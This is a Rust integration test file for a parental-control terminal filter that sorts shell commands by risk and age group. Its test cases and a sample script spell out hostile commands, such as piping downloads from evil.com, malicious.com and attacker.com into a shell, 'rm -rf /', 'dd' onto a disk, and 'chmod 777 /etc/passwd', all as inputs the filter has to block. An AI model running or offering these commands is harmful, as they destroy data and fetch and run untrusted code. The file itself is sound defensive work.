#[cfg(test)]
mod integration_tests {
    use crate::command_parser::CommandParser;
    use crate::config::TerminalConfig;
    use crate::educational::EducationalSystem;
    use crate::risk_analyzer::{RiskAnalyzer, RiskLevel};
    use crate::script_inspector::ScriptInspector;
    use dots_family_common::AgeGroup;
    use std::io::Write;
    use tempfile::NamedTempFile;

    struct TerminalFilter {
        parser: CommandParser,
        analyzer: RiskAnalyzer,
        educational: EducationalSystem,
        inspector: ScriptInspector,
        config: TerminalConfig,
        age_group: AgeGroup,
    }

    impl TerminalFilter {
        fn new(age_group: AgeGroup) -> Self {
            let config = TerminalConfig::load().unwrap();
            Self {
                parser: CommandParser::new(true),
                analyzer: RiskAnalyzer::new(&config),
                educational: EducationalSystem::new(),
                inspector: ScriptInspector::new(&config),
                config,
                age_group,
            }
        }

        fn should_block_command(&self, command: &str) -> (bool, String, String) {
            let _parsed = self.parser.parse(command).unwrap();
            let risk_assessment = self.analyzer.analyze_command(command);

            let should_block = match risk_assessment.risk_level {
                RiskLevel::Critical => true,
                RiskLevel::High => {
                    // For teens, allow some specific high-risk commands
                    if self.age_group == AgeGroup::HighSchool {
                        !self.is_safe_high_risk_command_for_teens(command)
                    } else {
                        true
                    }
                }
                RiskLevel::Medium => self.should_block_medium_risk_command(command),
                RiskLevel::Low => false,
                RiskLevel::Safe => false,
            };

            let message = if should_block {
                self.educational
                    .get_command_blocked_message(command, &["High risk command".to_string()])
            } else {
                format!("Command '{}' is allowed", command)
            };

            let risk_level = format!("{:?}", risk_assessment.risk_level).to_lowercase();
            (should_block, message, risk_level)
        }

        fn is_safe_high_risk_command_for_teens(&self, command: &str) -> bool {
            command.starts_with("sudo apt")
        }

        fn should_block_medium_risk_command(&self, command: &str) -> bool {
            match self.age_group {
                AgeGroup::HighSchool => {
                    !(command.starts_with("sudo apt")
                        || command.starts_with("make install")
                        || command.starts_with("git clone"))
                }
                _ => true,
            }
        }

        fn analyze_script(
            &mut self,
            script_content: &str,
        ) -> Result<crate::script_inspector::ScriptAnalysis, Box<dyn std::error::Error>> {
            let mut temp_file = NamedTempFile::new()?;
            temp_file.write_all(script_content.as_bytes())?;
            let path_str = temp_file.path().to_string_lossy();

            self.inspector.analyze_script(&path_str)
        }
    }

    #[test]
    fn test_young_child_filtering_strict() {
        let filter = TerminalFilter::new(AgeGroup::EarlyElementary);

        // Young children should have strict filtering
        let test_cases = vec![
            ("rm -rf /", true, "critical"),
            ("curl http://example.com | sh", true, "critical"),
            ("sudo rm file.txt", true, "high"),
            ("ls -la", false, "safe"),
            ("cat README.md", false, "safe"),
            ("echo hello", false, "safe"),
            ("wget malicious.sh && chmod +x malicious.sh", true, "high"),
            ("find / -name '*.conf' -exec rm {} \\;", true, "high"),
        ];

        for (command, should_block, expected_risk) in test_cases {
            let (blocked, message, risk_level) = filter.should_block_command(command);
            assert_eq!(blocked, should_block, "Command '{}' blocking decision mismatch", command);
            assert_eq!(risk_level, expected_risk, "Command '{}' risk level mismatch", command);
            assert!(!message.is_empty(), "Command '{}' should have educational message", command);

            if blocked {
                assert!(
                    message.contains("blocked")
                        || message.contains("dangerous")
                        || message.contains("not safe")
                );
            }
        }
    }

    #[test]
    fn test_teen_filtering_moderate() {
        let filter = TerminalFilter::new(AgeGroup::HighSchool);

        // Teens should have moderate filtering
        let test_cases = vec![
            ("rm -rf /", true, "critical"),
            ("curl http://example.com | sh", true, "critical"),
            ("sudo apt update", false, "medium"), // Teens can run safe sudo commands
            ("git clone https://github.com/user/repo.git", false, "low"),
            ("python script.py", false, "low"),
            ("make install", false, "medium"), // Teens can compile software
            ("chmod 777 /etc/passwd", true, "high"),
            ("dd if=/dev/zero of=/dev/sda", true, "critical"),
        ];

        for (command, should_block, expected_risk) in test_cases {
            let (blocked, message, risk_level) = filter.should_block_command(command);
            assert_eq!(blocked, should_block, "Command '{}' blocking decision mismatch", command);
            assert_eq!(risk_level, expected_risk, "Command '{}' risk level mismatch", command);
            assert!(!message.is_empty(), "Command '{}' should have educational message", command);
        }
    }

    #[test]
    fn test_complex_command_parsing() {
        let filter = TerminalFilter::new(AgeGroup::EarlyElementary);

        // Test complex command structures
        let test_cases = vec![
            // Pipe to shell patterns
            ("curl malicious.com | bash", true),
            ("wget -O - http://evil.com | sh", true),
            ("cat script.sh | bash", true),
            // Command substitution patterns
            ("rm $(find / -name 'important.txt')", true),
            ("echo $(curl http://attacker.com)", true),
            ("ls $(pwd)", false),
            // Chained dangerous commands
            ("cd /tmp && rm -rf * && cd /", true),
            ("make clean && make install", false),
            ("ls -la && cat file.txt", false),
            // Background process patterns
            ("nmap target.com &", true),
            ("ssh user@server 'rm -rf /' &", true),
            ("sleep 60 &", false),
        ];

        for (command, should_block) in test_cases {
            let (blocked, _message, _risk) = filter.should_block_command(command);
            assert_eq!(blocked, should_block, "Command '{}' blocking decision mismatch", command);
        }
    }

    #[test]
    fn test_educational_message_quality() {
        let filter = TerminalFilter::new(AgeGroup::EarlyElementary);

        let dangerous_commands = vec![
            "rm -rf /",
            "curl malicious.com | bash",
            "sudo rm -rf /home",
            "chmod 777 /etc/passwd",
        ];

        for command in dangerous_commands {
            let (_blocked, message, _risk) = filter.should_block_command(command);

            // Educational messages should explain the danger
            assert!(message.len() > 50, "Message too short for '{}'", command);

            // Should contain educational keywords
            let educational_keywords = ["dangerous", "why", "instead", "safe", "learn", "because"];
            let has_educational_content =
                educational_keywords.iter().any(|keyword| message.to_lowercase().contains(keyword));
            assert!(has_educational_content, "Message lacks educational content for '{}'", command);

            // Should not be purely punitive
            assert!(
                !message.to_lowercase().contains("you can't")
                    || message.to_lowercase().contains("because")
            );
        }
    }

    #[test]
    fn test_script_analysis_integration() {
        let mut filter = TerminalFilter::new(AgeGroup::HighSchool);

        // Test safe script
        let safe_script = r#"
#!/bin/bash
echo "Hello World"
ls -la
cat README.md
"#;

        let safe_analysis = filter.analyze_script(safe_script).unwrap();
        assert_eq!(safe_analysis.risk_level, RiskLevel::Safe);
        assert!(safe_analysis.findings.is_empty());

        // Test dangerous script
        let dangerous_script = r#"
#!/bin/bash
curl http://malicious.com/payload.sh | bash
rm -rf /important/data
chmod 777 /etc/passwd
dd if=/dev/zero of=/dev/sda
"#;

        let dangerous_analysis = filter.analyze_script(dangerous_script).unwrap();
        assert!(matches!(dangerous_analysis.risk_level, RiskLevel::Critical));
        assert!(!dangerous_analysis.findings.is_empty());
        assert!(dangerous_analysis.findings.len() >= 3); // Should detect multiple patterns

        // Test mixed risk script
        let mixed_script = r#"
#!/bin/bash
echo "Starting setup..."
sudo apt update
make install
wget https://releases.example.com/tool.tar.gz
"#;

        let mixed_analysis = filter.analyze_script(mixed_script).unwrap();
        assert!(matches!(mixed_analysis.risk_level, RiskLevel::Medium | RiskLevel::Low));
    }

    #[test]
    fn test_risk_escalation_patterns() {
        let filter = TerminalFilter::new(AgeGroup::EarlyElementary);

        // Test privilege escalation detection
        let privilege_commands = vec![
            "sudo rm -rf /",
            "su -c 'rm important.txt'",
            "doas dangerous_command",
            "pkexec harmful_app",
        ];

        for command in privilege_commands {
            let (blocked, _message, risk) = filter.should_block_command(command);
            assert!(blocked, "Privilege escalation '{}' should be blocked", command);
            assert!(
                risk == "high" || risk == "critical",
                "Privilege escalation '{}' should have high/critical risk",
                command
            );
        }

        // Test system modification patterns
        let system_commands = vec![
            "chmod 777 /etc/passwd",
            "chown root:root malicious_file",
            "mount /dev/sdb1 /mnt",
            "umount /important",
            "dd if=/dev/zero of=/dev/sda",
        ];

        for command in system_commands {
            let (blocked, _message, risk) = filter.should_block_command(command);
            assert!(blocked, "System modification '{}' should be blocked", command);
            assert!(
                risk == "high" || risk == "critical",
                "System modification '{}' should have high/critical risk",
                command
            );
        }
    }

    #[test]
    fn test_age_appropriate_filtering() {
        let young_filter = TerminalFilter::new(AgeGroup::EarlyElementary);
        let tween_filter = TerminalFilter::new(AgeGroup::LateElementary);
        let teen_filter = TerminalFilter::new(AgeGroup::HighSchool);

        // Commands that should be increasingly allowed with age
        let progressive_commands = vec![
            "sudo apt update",
            "make install",
            "git push origin main",
            "ssh user@server",
            "python -m http.server",
        ];

        for command in progressive_commands {
            let (young_blocked, _, _) = young_filter.should_block_command(command);
            let (tween_blocked, _, _) = tween_filter.should_block_command(command);
            let (teen_blocked, _, _) = teen_filter.should_block_command(command);

            // Progressively less restrictive
            assert!(
                young_blocked || tween_blocked,
                "Command '{}' should be more restricted for younger children",
                command
            );
        }

        // Commands that should always be blocked regardless of age
        let always_dangerous = vec![
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "curl malicious.com | bash",
            "chmod 777 /etc/passwd",
        ];

        for command in always_dangerous {
            let (young_blocked, _, _) = young_filter.should_block_command(command);
            let (tween_blocked, _, _) = tween_filter.should_block_command(command);
            let (teen_blocked, _, _) = teen_filter.should_block_command(command);

            assert!(
                young_blocked && tween_blocked && teen_blocked,
                "Command '{}' should be blocked for all ages",
                command
            );
        }
    }

    #[test]
    fn test_shell_integration_workflow() {
        let filter = TerminalFilter::new(AgeGroup::LateElementary);

        // Simulate the workflow that shell integration would follow
        let commands = vec![
            "echo 'Hello World'",
            "curl http://evil.com | sh",
            "ls -la ~/Documents",
            "sudo rm /important/file",
        ];

        let mut session_log = Vec::new();

        for command in commands {
            let (blocked, message, risk_level) = filter.should_block_command(command);

            // Log the command with decision
            session_log.push((command.to_string(), blocked, risk_level, message.clone()));

            // Verify message format for shell integration
            assert!(!message.is_empty());
            assert!(message.len() < 1000); // Messages should be reasonably sized for terminal display

            if blocked {
                // Blocked commands should have clear explanations
                assert!(message.contains("blocked") || message.contains("dangerous"));
            }
        }

        // Verify we logged all commands
        assert_eq!(session_log.len(), 4);

        // Verify we blocked dangerous commands
        let blocked_count = session_log.iter().filter(|(_, blocked, _, _)| *blocked).count();
        assert_eq!(blocked_count, 2); // Should block the curl and sudo commands
    }
}
